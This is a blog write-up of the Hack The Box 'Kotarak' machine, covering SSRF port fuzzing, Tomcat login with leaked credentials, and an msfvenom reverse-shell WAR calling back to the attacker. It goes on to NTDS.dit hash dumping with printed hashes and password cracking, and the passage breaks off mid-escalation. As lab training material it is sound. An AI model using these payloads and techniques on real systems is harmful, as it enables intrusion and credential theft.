<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HTB: Kotarak :: The Logan Lab</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="**HTB | Kotarak - Write up**" />
<meta name="keywords" content=", " />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://theloganlab.github.io/posts/kotarak/" />




<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">

  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">






<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB: Kotarak">
<meta property="og:description" content="**HTB | Kotarak - Write up" />
<meta property="og:url" content="https://theloganlab.github.io/posts/kotarak/" />
<meta property="og:site_name" content="The Logan Lab" />

  <meta property="og:image" content="https://theloganlab.github.io/Kotarak.png">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-13 11:05:50 -0500 -05" />












</head>
<body class="green">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    l0gan334&#39;s lab
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://theloganlab.github.io/posts/kotarak/">HTB: Kotarak</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-13
        
      </span>
    
    
      <span class="post-author">:: l0gan334</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://theloganlab.github.io/tags/ssrf/">SSRF</a>&nbsp;
    
    #<a href="https://theloganlab.github.io/tags/tomcat/">Tomcat</a>&nbsp;
    
    #<a href="https://theloganlab.github.io/tags/malicious_war/">malicious_WAR</a>&nbsp;
    
    #<a href="https://theloganlab.github.io/tags/dumping_hashes/">dumping_hashes</a>&nbsp;
    
    #<a href="https://theloganlab.github.io/tags/wget/">wget</a>&nbsp;
    
    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
    
  </span>
  
  
  <img src="https://theloganlab.github.io/Kotarak.png"
    class="post-cover"
    alt="HTB: Kotarak"
    title="Cover Image" />


  

  <div class="post-content"><div>
        <p><strong>Kotarak</strong> an OG machine in Hack the Box.</p>
<p>We will start with a <strong>Server-Side Request Forgery</strong> that willl lead us into an information leakage of a Tomcat config file with credentials.</p>
<p>Next up we will exploit the Tomcat instance as usual, with a maliciou WAR file that will get us a reverse shell.</p>
<p>Then we will get access to some files from a Windows pentest that include a ntds.dit file and a system hive. This will let us dump a lot of hashes, one of them being the password for the next user.</p>
<p>For root we will exploit a Wget vulnerable version where will manage to write a malicious config file in the root directory of the container where the root flag is located, letting us see it.</p>
<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>nmap finds four ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.1.117 -oG allPorts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-13 11:13 -05
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:13
</span></span><span style="display:flex;"><span>Scanning 10.129.1.117 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 8080/tcp on 10.129.1.117
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.1.117
</span></span><span style="display:flex;"><span>Discovered open port 60000/tcp on 10.129.1.117
</span></span><span style="display:flex;"><span>Discovered open port 8009/tcp on 10.129.1.117
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:14, 14.56s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.117
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp    open  ssh
</span></span><span style="display:flex;"><span>8009/tcp  open  ajp13
</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy
</span></span><span style="display:flex;"><span>60000/tcp open  unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.70 seconds
</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">71314</span> <span style="color:#f92672">(</span>3.138MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">71145</span> <span style="color:#f92672">(</span>2.846MB<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>With the parameter <strong>-oG</strong> we are exporting the result in <strong>grepable format</strong>, which is great to manage with <strong>regex</strong> and get all the ports without needing to type them one by one:</p>



  <div class="collapsable-code">
    <input id="1" type="checkbox"  />
    <label for="1">
      <span class="collapsable-code__language">bash</span>
      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-bash" ><code>
extractPorts () {
	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
</code></pre>
  </div>


<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.1.117
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 22,8009,8080,60000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
</span></span></code></pre></div><p>With parameters <strong>-sCV</strong> we can take a deeper look into these ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,8009,8080,60000 10.129.1.117 -oN targeted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-13 11:18 -05
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.117
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8009/tcp  open  ajp13   Apache Jserv <span style="color:#f92672">(</span>Protocol v1.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ajp-methods:
</span></span><span style="display:flex;"><span>|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
</span></span><span style="display:flex;"><span>|   Potentially risky methods: PUT DELETE
</span></span><span style="display:flex;"><span>|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
</span></span><span style="display:flex;"><span>8080/tcp  open  http    Apache Tomcat 8.5.5
</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat/8.5.5 - Error report
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT DELETE
</span></span><span style="display:flex;"><span>|_http-favicon: Apache Tomcat
</span></span><span style="display:flex;"><span>60000/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-title:         Kotarak Web Hosting
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 54.04 seconds
</span></span></code></pre></div><h1 id="ports-8080---8009">Ports 8080 - 8009<a href="#ports-8080---8009" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Port 8080 is an instance of Apache Tomcat:</p>

  <img src="/img/kot1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>As usual, in <strong>/manager/html</strong> we can find a login panel. But after trying some default passwords none of them work.</p>

  <img src="/img/kot2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>On the other hand, port 8009 is a default Tomcat port, so it gives access to the same content we would see in <strong>/manager/html</strong> on port 8080.</p>
<h1 id="port-8006">Port 8006<a href="#port-8006" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>This port hosts a private browser:</p>

  <img src="/img/kot3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>We can test if it works by setting a python server with a test file with some php content as is the language used by the web, we know this because of the extension <strong>Wappalyzer</strong>:</p>

  <img src="/img/kot4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>It actually sends the petition and displays its content but it doesn&rsquo;t interprete the code.</p>
<h1 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)<a href="#server-side-request-forgery-ssrf" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>But what if we make it point to itself?</p>

  <img src="/img/kot5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />



  <img src="/img/kot6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>It works! This way we can fuzz for the opened ports locally inside the machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wfuzz -c -t <span style="color:#ae81ff">200</span> --hh<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> -z range,1-65535 <span style="color:#e6db74">&#34;http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ&#34;</span>
</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://10.129.1.117:60000/url.php?path<span style="color:#f92672">=</span>http://localhost:FUZZ
</span></span><span style="display:flex;"><span>Total requests: 65535
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000000200:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">3</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">22</span> Ch       <span style="color:#e6db74">&#34;200&#34;</span>
</span></span><span style="display:flex;"><span>000000320:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">26</span> L     <span style="color:#ae81ff">109</span> W      <span style="color:#ae81ff">1232</span> Ch     <span style="color:#e6db74">&#34;320&#34;</span>
</span></span><span style="display:flex;"><span>000000022:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">4</span> L      <span style="color:#ae81ff">4</span> W        <span style="color:#ae81ff">62</span> Ch       <span style="color:#e6db74">&#34;22&#34;</span>
</span></span><span style="display:flex;"><span>000000888:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">78</span> L     <span style="color:#ae81ff">265</span> W      <span style="color:#ae81ff">3955</span> Ch     <span style="color:#e6db74">&#34;888&#34;</span>
</span></span><span style="display:flex;"><span>000000090:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">11</span> L     <span style="color:#ae81ff">18</span> W       <span style="color:#ae81ff">156</span> Ch      <span style="color:#e6db74">&#34;90&#34;</span>
</span></span><span style="display:flex;"><span>000000110:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">17</span> L     <span style="color:#ae81ff">24</span> W       <span style="color:#ae81ff">187</span> Ch      <span style="color:#e6db74">&#34;110&#34;</span>
</span></span><span style="display:flex;"><span>000003306:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">2</span> L      <span style="color:#ae81ff">7</span> W        <span style="color:#ae81ff">123</span> Ch      <span style="color:#e6db74">&#34;3306&#34;</span>
</span></span><span style="display:flex;"><span>000008080:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">2</span> L      <span style="color:#ae81ff">47</span> W       <span style="color:#ae81ff">994</span> Ch      <span style="color:#e6db74">&#34;8080&#34;</span>
</span></span></code></pre></div><p>There&rsquo;s many of them, but the one with the information we need is <strong>port 888</strong> let&rsquo;s take a look:</p>

  <img src="/img/kot7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Backup seems very interesting. If we do hovering we can see where this links to:</p>
<p>
  <img src="/img/kot8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />



  <img src="/img/kot9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />

</p>
<p>Now we know how we can reach to this resource:</p>

  <img src="/img/kot10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Apparently we don&rsquo;t have anything, but if we check the source code with Ctrl + U we can see the content of the file:</p>

  <img src="/img/kot11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h1 id="abusing-tomcat">Abusing Tomcat<a href="#abusing-tomcat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>At the bottom there are some credentials leaked, which we will use to login to the Tomcat instance:</p>

  <img src="/img/kot12.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>And it works.</p>

  <img src="/img/kot13.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Now we can get a reverse shell as usual, uploading a maliciou WAR file.</p>
<p>Let&rsquo;s create this file with <strong>msfvenom</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.161 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">334</span> -f war -o shell.war
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">1105</span> bytes
</span></span><span style="display:flex;"><span>Final size of war file: <span style="color:#ae81ff">1105</span> bytes
</span></span><span style="display:flex;"><span>Saved as: shell.war
</span></span></code></pre></div><p>Set a listener in your chosen port and upload the file and open it:

  <img src="/img/kot14.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />

</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.117.
</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.1.117:57260.
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>tomcat
</span></span></code></pre></div><p>We get a shell but not an interactive <strong>tty</strong>, so if we do ^C we lose the connection with a tty treatment we can fix this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ ^Z
</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
</span></span><span style="display:flex;"><span>                              reset xterm
</span></span></code></pre></div><p>And lastly some final touches like the screen size (you can get yours doing <code>stty size</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ export TERM<span style="color:#f92672">=</span>xterm
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ export SHELL<span style="color:#f92672">=</span>bash
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">145</span>
</span></span></code></pre></div><p>The user flag is inside atanas&rsquo; home directory but we cannot access it yet.</p>
<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Inside <strong>/home</strong> there&rsquo;s a directory <strong>tomcat</strong> that contains some information about a pentest:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
</span></span><span style="display:flex;"><span>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit  
</span></span><span style="display:flex;"><span>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
</span></span></code></pre></div><p>The <strong>.dit</strong> file is likely to be an active directory database from a domain controller, ntds.dit.</p>
<h1 id="dumping-hashes">Dumping hashes<a href="#dumping-hashes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>This will be very helpful for us since we can extract all the hashes from an <strong>ntds.dit</strong> with <strong>secretsdump</strong> using the SYSTEM reg hive, the <strong>.bin</strong>.</p>
<p>Let&rsquo;s send over both files and try to dump the hashes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ secretsdump.py -ntds ntds.dit -system ntds.bin LOCAL
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domainid:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
</span></span><span style="display:flex;"><span>WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
</span></span><span style="display:flex;"><span>WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
</span></span><span style="display:flex;"><span>WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
</span></span><span style="display:flex;"><span>WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
</span></span><span style="display:flex;"><span>atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... ... ...
</span></span></code></pre></div><h1 id="cracking-hashes">Cracking hashes<a href="#cracking-hashes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>There&rsquo;s a lot of hashes, I will try to crack the NTLM hashes with <strong>crackstation.net</strong>:</p>

  <img src="/img/kot15.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><em>f16tomcat!</em> turns out to be atanas&rsquo; password, now we can migrate to that user and see the <strong>user.txt</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tomcat@kotarak-dmz:/home/atanas$ su atanass
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:~$ cat user.txt
</span></span><span style="display:flex;"><span>93f844f50491ef7*****************
</span></span></code></pre></div><h1 id="privilege-escalation"><strong><code>Privilege escalation</code></strong><a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>As atanas we actually have access to the root directory and a <strong>flag.txt</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ ls
</span></span><span style="display:flex;"><span>app.log  flag.txt
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ cat flag.txt
</span></span><span style="display:flex;"><span>Getting closer! But what you are looking <span style="color:#66d9ef">for</span> can<span style="color:#960050;background-color:#1e0010">&#39;</span>t be found here.
</span></span></code></pre></div><p>If it&rsquo;s not here maybe it&rsquo;s inside of a container.</p>
<p>There&rsquo;s also an <strong>app.log</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ cat app.log
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:48:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:50:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:52:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span></code></pre></div><p>It&rsquo;s a log of some connections made from <strong>10.0.3.133</strong> trying to get an <strong>archive.tar.gz</strong> from our host.</p>
<p>But we don&rsquo;t seem have access to port 80:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/runpy.py&#34;</span>, line 174, in _run_module_as_main
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;__main__&#34;</span>, fname, loader, pkg_name<span style="color:#f92672">)</span>
